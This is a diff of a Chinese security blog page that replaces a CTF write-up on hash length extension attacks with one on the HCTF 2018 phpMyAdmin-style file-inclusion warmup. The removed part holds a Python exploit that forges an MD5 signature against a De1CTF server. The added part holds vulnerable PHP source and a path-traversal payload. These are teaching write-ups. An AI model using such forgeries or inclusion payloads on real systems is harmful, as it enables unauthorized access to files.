@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="hash,De1ctf,">
+  <meta name="keywords" content="Hexo, NexT">
 
 
 
@@ -81,25 +81,20 @@
 
 
 
-<meta name="description" content="目前还是太菜了，向师傅们好好学习 SSRF me 点开首页就是一长串代码, curl重定向保存到文件中,然后仔细分析了一下代码 程序主要涉及到三个参数,一个是param在get中,另外两个action和sign是通过cookie获得的 访问/geneSign可以得到sign的值, action可以是scan或read,但是在访问/De1ctf时,会检验sign是否正确,sign的生成算法： 12d">
-<meta name="keywords" content="hash,De1ctf">
+<meta name="description" content="phpmyadmin 这个漏洞可以说是由于太过细心而导致的，这也证实了安全永远在路上 这篇文章已经讲的很详细了，这里写一下hctf2018的一道热身题，当时都还没仔细想过是一个已经存在的CVE 题目源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&amp;lt;?php">
 <meta property="og:type" content="article">
-<meta property="og:title" content="初见哈希扩展攻击">
-<meta property="og:url" content="https://prontosil.club/2019/08/05/初见哈希扩展攻击/index.html">
+<meta property="og:title" content="phpmyadmin远程文件包含漏洞">
+<meta property="og:url" content="https://prontosil.club/2019/08/19/phpmyadmin远程文件包含漏洞/index.html">
 <meta property="og:site_name" content="prontosil">
-<meta property="og:description" content="目前还是太菜了，向师傅们好好学习 SSRF me 点开首页就是一长串代码, curl重定向保存到文件中,然后仔细分析了一下代码 程序主要涉及到三个参数,一个是param在get中,另外两个action和sign是通过cookie获得的 访问/geneSign可以得到sign的值, action可以是scan或read,但是在访问/De1ctf时,会检验sign是否正确,sign的生成算法： 12d">
+<meta property="og:description" content="phpmyadmin 这个漏洞可以说是由于太过细心而导致的，这也证实了安全永远在路上 这篇文章已经讲的很详细了，这里写一下hctf2018的一道热身题，当时都还没仔细想过是一个已经存在的CVE 题目源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&amp;lt;?php">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba0.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba4.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba3.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba5.png">
-<meta property="og:updated_time" content="2019-08-05T12:33:57.202Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/hctf0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/hctf1.png">
+<meta property="og:updated_time" content="2019-08-19T09:22:15.247Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="初见哈希扩展攻击">
-<meta name="twitter:description" content="目前还是太菜了，向师傅们好好学习 SSRF me 点开首页就是一长串代码, curl重定向保存到文件中,然后仔细分析了一下代码 程序主要涉及到三个参数,一个是param在get中,另外两个action和sign是通过cookie获得的 访问/geneSign可以得到sign的值, action可以是scan或read,但是在访问/De1ctf时,会检验sign是否正确,sign的生成算法： 12d">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba0.png">
+<meta name="twitter:title" content="phpmyadmin远程文件包含漏洞">
+<meta name="twitter:description" content="phpmyadmin 这个漏洞可以说是由于太过细心而导致的，这也证实了安全永远在路上 这篇文章已经讲的很详细了，这里写一下hctf2018的一道热身题，当时都还没仔细想过是一个已经存在的CVE 题目源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&amp;lt;?php">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/hctf0.png">
 
 
 
@@ -129,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="https://prontosil.club/2019/08/05/初见哈希扩展攻击/">
+  <link rel="canonical" href="https://prontosil.club/2019/08/19/phpmyadmin远程文件包含漏洞/">
 
 
 
 
 
-  <title>初见哈希扩展攻击 | prontosil</title>
+  <title>phpmyadmin远程文件包含漏洞 | prontosil</title>
   
 
 
@@ -308,7 +303,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/08/05/初见哈希扩展攻击/">
+    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/08/19/phpmyadmin远程文件包含漏洞/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="百浪多息">
@@ -325,7 +320,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">初见哈希扩展攻击</h1>
+          <h1 class="post-title" itemprop="name headline">phpmyadmin远程文件包含漏洞</h1>
         
 
 		
@@ -340,8 +335,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-05T20:05:49+08:00">
-                2019-08-05
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-19T17:13:48+08:00">
+                2019-08-19
               </time>
             
 
@@ -356,34 +351,12 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-08-05T20:33:57+08:00">
-                2019-08-05
+              <time title="Post modified" itemprop="dateModified" datetime="2019-08-19T17:22:15+08:00">
+                2019-08-19
               </time>
             
           </span>
 
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -406,7 +379,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  866
+                  291
                 </span>
               
 
@@ -422,7 +395,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  3
+                  1
                 </span>
               
             </div>
@@ -443,47 +416,19 @@
       
 
       
-        <p>目前还是太菜了，向师傅们好好学习</p>
-<h2>SSRF me</h2>
-<p>点开首页就是一长串代码, curl重定向保存到文件中,然后仔细分析了一下<a href="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/index.py" target="_blank" rel="noopener">代码</a></p>
-<p>程序主要涉及到三个参数,一个是param在get中,另外两个action和sign是通过cookie获得的
-访问<code>/geneSign</code>可以得到sign的值, action可以是<code>scan</code>或<code>read</code>,但是在访问<code>/De1ctf</code>时,会检验sign是否正确,sign的生成算法：</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure></p>
-<p>这其中<code>secret_key</code>是不知道的,并且<code>gengeSign</code>限制了action只能是<code>scan</code>,结合后来题目的提示是访问<code>flag.txt</code>,但是最多将这个文件读入<code>result.txt</code>,却不能读取出来。</p>
-<p>这样想来是不是只能爆破<code>secret_key</code>了？但是<code>secret_key</code>又怎么会那么容易给你呢。。</p>
-<p>这就涉及到我的知识盲区了,叫做哈希扩展攻击。。</p>
-<p>先看实验吧一道例题</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba0.png" alt=""></p>
-<p>这题，注入不想注入，源码没扫出来，啥信息都没有？</p>
-<p>还是要多关注抓包的信息，尤其是数据包中出现了一些你都没有看过的东西的时候就要仔细看一看了</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba1.png" alt=""></p>
-<p>hhh没想到吧</p>
-<p>原来可以通过这种方式获取到源代码。。</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">""</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>empty函数 非空返回false，别想多了</p>
-</blockquote>
-<p>关键在这里：
-<code>if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {</code></p>
-<p>其中<code>$secret</code>是不知道的，<code>$username</code>和<code>password</code>是可以控制的，并且<code>$secret</code>的长度是15</p>
-<p>哈希扩展攻击的原理之后再讨论，我们先分析这题咋搞</p>
-<p>首先username必须是admin,password不能是admin那就随便输一个值比如cck</p>
-<p>我们的目标很简单，就是绕过它
-<code>if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {</code></p>
-<p>所以目标就是让<code>$COOKIE[&quot;getmein&quot;]</code>和md5后的值相等，所以需要同时伪造两边的值天平才能平衡</p>
-<p>而hashpump工具就是来干这个的：
-<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba2.png" alt=""></p>
-<p>第一个参数是<code>md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;))</code>的值，第二个参数是填充的数据，第三个参数是填充数据加key的长度，第四个参数是添加的数据。
-这样就能同时生成天平左边和右边的值了</p>
-<p>当然还需要URL编码一下</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba4.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba3.png" alt=""></p>
-<p>理解了这题那么这道De1ctf的题目也就好说了</p>
-<p>参考ctftime上的exp代码如下：</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,hashpumpy,urllib</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Arguments:</span></span><br><span class="line"><span class="string">    hexdigest(str):      Hex-encoded result of hashing key + original_data.</span></span><br><span class="line"><span class="string">    original_data(str):  Known data used to get the hash result hexdigest.</span></span><br><span class="line"><span class="string">    data_to_add(str):    Data to append</span></span><br><span class="line"><span class="string">    key_length(int):     Length of unknown data prepended to the hash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">    A tuple containing the new hex digest and the new message.</span></span><br><span class="line"><span class="string">'</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">payload = <span class="string">'flag.txt'</span></span><br><span class="line">param = <span class="string">'param='</span> + payload</span><br><span class="line">base_url = <span class="string">'http://139.180.128.86/'</span></span><br><span class="line">signurl = base_url + <span class="string">'geneSign?'</span> + param</span><br><span class="line">r = requests.post(url=signurl,cookies=&#123;<span class="string">'action'</span>:<span class="string">'scan'</span>&#125;)</span><br><span class="line">sign = r.content</span><br><span class="line">print(sign)</span><br><span class="line">readsign,add_data = hashpumpy.hashpump(sign,payload+<span class="string">'scan'</span>,<span class="string">'read'</span>,<span class="number">16</span>)</span><br><span class="line">print(readsign)</span><br><span class="line"><span class="comment"># print add_data</span></span><br><span class="line">add_data = add_data[len(payload):]</span><br><span class="line">print(add_data)</span><br><span class="line">expurl = base_url + <span class="string">'De1ta?'</span> + param</span><br><span class="line">print(urllib.parse.quote(add_data))</span><br><span class="line">r = requests.post(url=expurl,cookies=&#123;<span class="string">'action'</span>:urllib.parse.quote(add_data),<span class="string">'sign'</span>:readsign&#125;)</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure></p>
-<p>当然我用的是python3，并且注意<code>urllib.parse.quote(add_data)</code>方法</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba5.png" alt=""></p>
-<p>就成功了</p>
+        <p>phpmyadmin 这个漏洞可以说是由于太过细心而导致的，这也证实了安全永远在路上</p>
+<p>这篇<a href="https://www.jianshu.com/p/0d75017c154f" target="_blank" rel="noopener">文章</a>已经讲的很详细了，这里写一下hctf2018的一道热身题，当时都还没仔细想过是一个已经存在的CVE</p>
+<p>题目源码：</p>
+<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>题目要绕过不算难，但是有一个地方很重要</p>
+<p>这是我在本地调试的目录：</p>
+<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/hctf0.png" alt=""></p>
+<p>调试的时候我使用了如下payload</p>
+<p><code>http://localhost/audit/warmup.php?file=source.php%253f/../flag.php</code></p>
+<p>此时能够成功绕过</p>
+<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/hctf1.png" alt=""></p>
+<p>就在这种情况下，文件包含也是成功的！</p>
+<p>所以这题就是这样。。</p>
 
       
     </div>
@@ -499,14 +444,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/hash/" rel="tag"># hash</a>
-          
-            <a href="/tags/De1ctf/" rel="tag"># De1ctf</a>
-          
-        </div>
-      
 
       
       
@@ -516,8 +453,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/04/noSQL-Injection/" rel="next" title="noSQL Injection">
-                <i class="fa fa-chevron-left"></i> noSQL Injection
+              <a href="/2019/08/19/redpwnctf复盘/" rel="next" title="redpwnctf复盘">
+                <i class="fa fa-chevron-left"></i> redpwnctf复盘
               </a>
             
           </div>
@@ -525,10 +462,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/08/05/windows资源管理器神器/" rel="prev" title="windows资源管理器神器">
-                windows资源管理器神器 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -582,17 +515,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -708,22 +632,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">SSRF me</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
